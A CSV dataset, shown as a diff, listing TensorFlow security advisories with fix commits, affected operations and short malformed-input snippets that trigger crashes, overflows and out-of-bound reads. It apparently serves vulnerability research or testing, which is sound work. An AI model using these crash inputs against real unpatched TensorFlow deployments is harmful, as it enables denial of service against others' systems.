+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-ph87-fvjr-v33w,https://github.com/tensorflow/tensorflow/commit/31bd5026304677faa8a0b77602c6154171b9aec1,tf.raw_ops,tf.raw_ops.RFFT,Zero element ,"fft_length = tf.constant([0], shape=[1], dtype=tf.int32)",fft_length,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-36vm-xw34-x4pj,https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2,tf.raw_ops,tf.raw_ops.IRFFT,Zero element ,"fft_length = tf.constant([0], shape=[1], dtype=tf.int32)",fft_length,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gvm4-h8j3-rjrq,https://github.com/tensorflow/tensorflow/commit/77dd114513d7796e1e2b8aece214a380af26fbf4,tf.raw_ops,tf.raw_ops.LoadAndRemapMatrix,Empty input,"ckpt_path = tf.constant([], shape=[0], dtype=tf.string)",ckpt_path,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-59q2-x2qc-4c97,https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298,tf.raw_ops,tf.raw_ops.UnicodeEncode,Element other than 0,"input_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)",input_splits,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-59q2-x2qc-4c97,https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298,tf.raw_ops,tf.raw_ops.UnicodeEncode,Last element in input_splits  != input_values ,"input_values = tf.constant([58], shape=[1], dtype=tf.int32)
+input_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)","input_values
+input_splits",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mqh2-9wrp-vx84,https://github.com/tensorflow/tensorflow/commit/8ba6fa29cd8bf9cef9b718dc31c78c73081f5b31,tf.raw_ops,tf.raw_ops.SparseSplit,Slice index is larger than num_split,"indices = tf.ones([1, 1], dtype=tf.int64
+num_split=1",indices,N.A,heap buffer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxqh-cfjm-fp93,https://github.com/tensorflow/tensorflow/commit/4071d8e2f6c45c1955a811fee757ca2adbe462c1,tf.raw_ops,tf.raw_ops.Reverse,Empty input,"tensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)",tensor_input ,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xw93-v57j-fcgh,https://github.com/tensorflow/tensorflow/commit/7f283ff806b2031f407db64c4d3edcda8fb9f9f5,tf.raw_ops,tf.raw_ops.SparseMatMul,Empty input,"b = tf.constant([], shape=[0, 2], dtype=tf.float32)",b,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r35g-4525-29fq,https://github.com/tensorflow/tensorflow/commit/1a2a87229d1d61e23a39373777c056161eb4084d,tf.raw_ops,tf.raw_ops.FusedBatchNorm,Zero element ,"x = tf.constant([], shape=[1, 1, 1, 0], dtype=tf.float32)",x,N.A,division by zero,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qg48-85hg-mqc5,https://github.com/tensorflow/tensorflow/commit/da5ff2daf618591f64b2b62d9d9803951b945e9f,tf.raw_ops,tf.raw_ops.DenseCountSparseOutput,Zero dimensional tensor,"values = tf.constant([], shape=[0, 0], dtype=tf.int64)",values,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jhq9-wm9m-cf89,https://github.com/tensorflow/tensorflow/commit/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe,tf.raw_ops,tf.raw_ops.UnsortedSegmentJoin,Empty input,"num_segments = tf.constant([], dtype=tf.int32)",num_segments,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h9px-9vqg-222h,https://github.com/tensorflow/tensorflow/commit/99085e8ff02c3763a0ec2263e44daec416f6a387,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV3,Axis larger than input dimension,"input=[2.5,2.5] 
+axis=3","input
+axis",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vqw6-72r7-fgw7,https://github.com/tensorflow/tensorflow/commit/480641e3599775a8895254ffbc0fc45621334f68,tf.raw_ops,tf.raw_ops.MatrixTriangularSolve,Empty input,"matrix_array = np.array([])
+rhs_array = np.array([])","matrix_array
+rhs_array",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f78g-q7r4-9wcv,https://github.com/tensorflow/tensorflow/commit/548b5eaf23685d86f722233d8fbc21d0a4aecb96,tf.raw_ops,tf.raw_ops.FractionalAvgPool,Pooling ratio bigger than input tensor dim size,"value = tf.constant([60], shape=[1, 1, 1, 1], dtype=tf.int32)
+pooling_ratio = [1.0, 1.0000014345305555, 1.0, 1.0]","value
+pooling_ratio",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x83m-p7pv-ch8v,https://github.com/tensorflow/tensorflow/commit/744009c9e5cc5d0447f0dc39d055f917e1fd9e16,tf.raw_ops,tf.raw_ops.QuantizedAdd,Zero element ,"y = tf.constant([], shape=[2, 0], dtype=tf.quint8)",y,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr,https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b,tf.raw_ops,tf.raw_ops.QuantizedBatchNormWithGlobalNormalization,Zero element ,"t_min = tf.constant(-10.0, dtype=tf.float32)
+t_max = tf.constant(-10.0, dtype=tf.float32)
+m_min = tf.constant(-10.0, dtype=tf.float32)
+m_max = tf.constant(-10.0, dtype=tf.float32)
+v_min = tf.constant(-10.0, dtype=tf.float32)
+v_max = tf.constant(-10.0, dtype=tf.float32)
+beta_min = tf.constant(-10.0, dtype=tf.float32)
+beta_max = tf.constant(-10.0, dtype=tf.float32)
+gamma_min = tf.constant(-10.0, dtype=tf.float32)
+gamma_max = tf.constant(-10.0, dtype=tf.float32)","t_min
+t_max
+m_min
+m_max
+v_min
+v_max
+beta_min
+beta_max
+gamma_min
+gamma_max",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr,https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b,tf.raw_ops,tf.raw_ops.QuantizedBatchNormWithGlobalNormalization,Empty input,"t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)
+m = tf.constant([], shape=[0], dtype=tf.quint8)
+v = tf.constant([], shape=[0], dtype=tf.quint8)
+beta = tf.constant([], shape=[0], dtype=tf.quint8)
+gamma = tf.constant([], shape=[0], dtype=tf.quint8)","t
+m
+v
+beta
+gamma",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p45v-v4pw-77jr,https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b,tf.raw_ops,tf.raw_ops.QuantizedBatchNormWithGlobalNormalization,Dimension mismatch,"m = tf.constant([], shape=[0], dtype=tf.quint8)
+v = tf.constant([], shape=[0], dtype=tf.quint8)
+beta = tf.constant([], shape=[0], dtype=tf.quint8)
+gamma = tf.constant([], shape=[0], dtype=tf.quint8)","m
+v
+beta
+gamma",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m34j-p8rj-wjxq,https://github.com/tensorflow/tensorflow/commit/67784700869470d65d5f2ef20aeb5e97c31673cb,tf.raw_ops,tf.raw_ops.QuantizedBiasAdd,Empty input,"bias = tf.constant([], shape=[0], dtype=tf.quint8)",bias,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fphq-gw9m-ghrv,https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2,tf.raw_ops,tf.raw_ops.CTCGreedyDecoder,Empty input,"inputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)",inputs,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6g85-3hm8-83f9,https://github.com/tensorflow/tensorflow/commit/20431e9044cf2ad3c0323c34888b192f3289af6b,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV4Grad,Dimension other than 1,"input_min = tf.constant([[0.0]], shape=[1, 1])
+input_max = tf.constant([[0.0]], shape=[1, 1])","input_min
+input_max",N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xgc3-m89p-vr3x,https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96,tf.raw_ops,tf.raw_ops.Conv2DBackpropFilter,Dimension mismatch,"input_tensor = tf.constant([386.078431372549, 386.07843139643234], shape=[1, 1, 1, 2], dtype=tf.float32)
+filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)","input_tensor
+filter_sizes",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xgc3-m89p-vr3x,https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96,tf.raw_ops,tf.raw_ops.Conv2DBackpropFilter,Dimension mismatch,"input_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)",input_tensor,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2gfx-95x2-5v3x,https://github.com/tensorflow/tensorflow/commit/a324ac84e573fba362a5e53d4e74d5de6729933e,tf.raw_ops,tf.raw_ops.QuantizedReshape,Empty input,"tensor = tf.constant([], dtype=tf.qint32)
+shape = tf.constant([], dtype=tf.int32)
+input_min = tf.constant([], dtype=tf.float32)
+input_max = tf.constant([], dtype=tf.float32)","tensor
+shape
+input_min
+input_max ",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8c89-2vwr-chcq,https://github.com/tensorflow/tensorflow/commit/f6c40f0c6cbf00d46c7717a26419f2062f2f8694,tf.raw_ops,tf.raw_ops.QuantizedResizeBilinear,Empty input,"images = tf.constant([], shape=[0], dtype=tf.qint32)
+size = tf.constant([], shape=[0], dtype=tf.int32) 
+min = tf.constant([], dtype=tf.float32)
+max = tf.constant([], dtype=tf.float32)","images
+size
+min
+max",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6j9c-grc6-5m6g,https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c,tf.raw_ops,tf.raw_ops.SparseConcat,Very large input argument,"shape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)",shape_1,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m3f9-w3p3-p669,https://github.com/tensorflow/tensorflow/commit/efea03b38fb8d3b81762237dc85e579cc5fc6e87,tf.raw_ops,tf.raw_ops.QuantizedMul,Non scalar input,"min_x = tf.constant([], dtype=tf.float32)
+max_x = tf.constant([], dtype=tf.float32)
+min_y = tf.constant([], dtype=tf.float32)
+max_y = tf.constant([], dtype=tf.float32)","min_x
+max_x
+min_y
+max_y",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-393f-2jr3-cp69,https://github.com/tensorflow/tensorflow/commit/b432a38fe0e1b4b904a6c222cbce794c39703e87,tf.raw_ops,tf.raw_ops.DrawBoundingBoxes,Empty input,"images = tf.fill([], 0.)",images,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j47f-4232-hvv8,https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a,tf.raw_ops,tf.raw_ops.RaggedCross,Empty input,"ragged_values = []
+ragged_row_splits = [] 
+sparse_indices = []
+sparse_values = []
+sparse_shape = []
+
+dense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)","ragged_values
+ragged_row_splits
+sparse_indices
+sparse_values
+sparse_shape
+
+dense_inputs_elem",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3qxp-qjq7-w4hf,https://github.com/tensorflow/tensorflow/commit/26eb323554ffccd173e8a79a8c05c15b685ae4d1,tf.raw_ops,tf.raw_ops.EncodePng,Empty input,"image = tf.zeros([0, 0, 3])",image,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xcwj-wfcm-m23c,https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd,tf.raw_ops,tf.raw_ops.SparseMatrixSparseCholesky,Empty input,"permutation = tf.constant([], shape=[1, 0], dtype=tf.int32)",permutation,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6f84-42vf-ppwp,https://github.com/tensorflow/tensorflow/commit/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6,tf.raw_ops,tf.raw_ops.QuantizedMul,Empty input,"y = tf.constant([], dtype=tf.quint8)",y,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4g7-fvjj-prg8,https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b,tf.raw_ops,tf.raw_ops.QuantizedConv2D,Zero argument,"min_input = tf.constant(0.0)
+min_filter = tf.constant(0.0)","min_input
+min_filter",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4g7-fvjj-prg8,https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b,tf.raw_ops,tf.raw_ops.QuantizedConv2D,Empty input,"filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)",filter,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4vf2-4xcg-65cx,https://github.com/tensorflow/tensorflow/commit/b12aa1d44352de21d1a6faaf04172d8c2508b42b,tf.raw_ops,tf.raw_ops.Conv2D,Empty input,"input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
+filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)","input
+filter",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xm2v-8rrw-w9pm,https://github.com/tensorflow/tensorflow/commit/2be2cdf3a123e231b16f766aa0e27d56b4606535,tf.raw_ops,tf.raw_ops.Conv2DBackpropInput,Empty input,"filter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)
+out_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)","filter_tensor
+out_backprop",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r4pj-74mg-8868,https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a,tf.raw_ops,tf.raw_ops.Conv2DBackpropFilter,Empty input,"input_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)
+out_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)","input_tensor
+out_backprop",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2cpx-427x-q2c6,https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c,tf.raw_ops,tf.raw_ops.AddManySparseToTensorsMap,Very large input argument,"shape = tf.Variable(tf.ones([55], dtype=tf.int64))
+shape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))","shape
+shape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))""",N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c968-pq7h-7fxv,https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa,tf.raw_ops,tf.raw_ops.Conv3DBackpropFilterV2,Empty input,"filter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)
+out_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)","filter_tensor
+out_backprop",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wcv5-qrj6-9pfm,https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197,tf.raw_ops,tf.raw_ops.Conv3DBackpropInputV2,Dimension mismatch,"input_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)
+filter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
+                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
+                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)
+out_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)","input_sizes
+filter_tensor
+out_backprop",N.A,heap buffer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hr84-fqvp-48mm,https://github.com/tensorflow/tensorflow/commit/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Negative element,"dense_shape = tf.constant([-100, -100, -100], shape=[3], dtype=tf.int64)",dense_shape,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772j-h9xw-ffp5,https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025,tf.raw_ops,tf.raw_ops.SparseCross,Integer tensors,"out_type = tf.string 
+internal_type = tf.string","out_type
+internal_type",N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-62gx-355r-9fhg,https://github.com/tensorflow/tensorflow/commit/ff70c47a396ef1e3cb73c90513da4f5cb71bebba,tf.raw_ops,tf.raw_ops.GetSessionTensor,Invalid argument,handle=['\x12\x1a\x07'],handle,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772p-x54p-hjrv,https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f,tf.raw_ops,tf.raw_ops.Conv3D,Empty input,"input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
+filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)","input_tensor
+filter_tensor",N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-772p-x54p-hjrv,https://github.com/tensorflow/tensorflow/commit/799f835a3dfa00a4d852defa29b15841eea9d64f,tf.raw_ops,tf.raw_ops.Conv3D,Dimension mismatch,"input_tensor = tf.constant([], shape=[2, 2, 2, 2, 0], dtype=tf.float32)
+filter_tensor = tf.constant([], shape=[0, 0, 2, 6, 2], dtype=tf.float32)","input_tensor
+filter_tensor",N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hc6c-75p4-hmq4,https://github.com/tensorflow/tensorflow/commit/a7116dd3913c4a4afd2a3a938573aa7c785fdfc6,tf.raw_ops,tf.raw_ops.MatrixDiagV2,Empty input,"d = tf.convert_to_tensor([],dtype=tf.float32)
+p = tf.convert_to_tensor([],dtype=tf.float32)","d
+p",N.A,nullptr dereference,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8h46-5m9h-7553,https://github.com/tensorflow/tensorflow/commit/eebb96c2830d48597d055d247c0e9aebaea94cd5,tf.raw_ops,tf.raw_ops.RaggedBincount,Element other than zero,"splits=[7,8]",splits,N.A,out of bound read,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g4h2-gqm3-c9wq,https://github.com/tensorflow/tensorflow/commit/eebb96c2830d48597d055d247c0e9aebaea94cd5,tf.raw_ops,tf.raw_ops.ImmutableConst,Invalid type,dtype=tf.resource,dtype,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hhvc-g5hv-48c6,https://github.com/tensorflow/tensorflow/commit/c1e1fc899ad5f8c725dcbb6470069890b5060bc7,tf.raw_ops,tf.raw_ops.ImmutableConst,Too small file,memory_region_name='/tmp/test.txt,memory_region_name,N.A,segfault,Write to immutable memory region
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1234',
+dst_format='1234'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='HHHH',
+dst_format='WWWW'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='H',
+dst_format='W'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1234',
+dst_format='1253'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1234',
+dst_format='1223'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1224',
+dst_format='1423'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1224',
+dst_format='432'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='12345678',
+dst_format='87654321'","src_format
+dst_format",N.A,N.A,uninitialized memory accesses
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xwhf-g6j5-j5gc,https://github.com/tensorflow/tensorflow/commit/c0319231333f0f16e1cc75ec83660b01fedd4182,tf.image,tf.image.crop_and_resize,Very large input argument,boxes,boxes,N.A,overflow,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-452g-f7fp-9jf7,https://github.com/tensorflow/tensorflow/commit/030af767d357d1b4088c4a25c72cb3906abac489,tf.raw_ops,tf.random.truncated_normal,invalid type,dtype=20,dtype,N.A,nullptr dereference,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrfp-j2mp-hq9c,https://github.com/tensorflow/tensorflow/commit/eccb7ec454e6617738554a255d77f08e60ee0808,tf.raw_ops,tf.quantization.quantize_and_dequantize,Invalid rank,axis=10,axis,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q8qj-fc9q-cphr,https://github.com/tensorflow/tensorflow/commit/22e07fb204386768e5bcbea563641ea11f96ceb8,tf.experimental,tf.experimental.dlpack.to_dlpack,python object,N.A,N.A,N.A,N.A,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8fxw-76px-3rxv,https://github.com/tensorflow/tensorflow/commit/22e07fb204386768e5bcbea563641ea11f96ceb8,tf.experimental,tf.experimental.dlpack.to_dlpack,python object,N.A,N.A,N.A,N.A,memory leak
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9mqp-7v2h-2382,https://github.com/tensorflow/tensorflow/commit/390611e0d45c5793c7066110af37c8514e6a6c54,tf.raw_ops,tf.raw_ops.SparseFillEmptyRowsGrad,Non vector input,grad_values,grad_values,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,"values = [1, 1, 1, 10]
+weights = [1, 2, 4]","values
+weights",N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,"indices = [[0, 0], [0, 1], [1, 0]]
+values = [1, 1, 1, 10]","indices
+values",N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,splits = [],splits,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,First element other than zero,"splits = [1, 7]",splits,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,split[-1] != len(values),"splits = [0, 5]
+values = [1, 1, 2, 1, 2, 10, 5]","indices
+values",N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,"values = [1, 1, 1, 10]
+weights = [1, 2, 4]","values
+weights",N.A,heap buffer overflow,N.A
